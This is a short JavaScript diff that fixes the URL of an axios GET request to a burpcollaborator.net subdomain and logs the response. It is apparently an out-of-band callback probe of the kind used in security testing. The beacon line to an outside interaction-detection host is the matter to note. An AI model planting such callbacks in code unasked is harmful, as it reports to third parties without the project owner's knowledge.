@@ -4,7 +4,7 @@ const axios = require('axios')
 // require("https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js")
 
 axios
-  .get('pkdadaq0s4oq84voecrqkp4c036vuk.burpcollaborator.net/from_axois/')
+  .get('https://pkdadaq0s4oq84voecrqkp4c036vuk.burpcollaborator.net/from_axois/')
   .then(res => {
     console.log(`statusCode: ${res.status}`)
     console.log(res)
